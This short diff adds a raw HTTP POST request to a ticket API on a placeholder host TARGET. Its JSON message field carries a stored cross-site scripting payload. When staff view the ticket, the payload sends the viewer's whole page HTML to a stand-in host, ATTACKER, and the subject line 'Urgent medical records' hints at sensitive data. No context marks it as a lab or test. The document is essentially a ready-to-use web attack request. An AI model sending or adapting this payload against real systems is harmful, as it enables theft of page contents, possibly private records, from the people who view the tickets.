@@ -1,0 +1,5 @@
+POST /api/tickets HTTP/1.1
+Referer: http://TARGET/dashboard.html
+Content-Type: application/json
+
+{"subject":"Urgent medical records","message":"<script>fetch('http://ATTACKER/x?html='+encodeURIComponent(document.documentElement.outerHTML))</script>"}
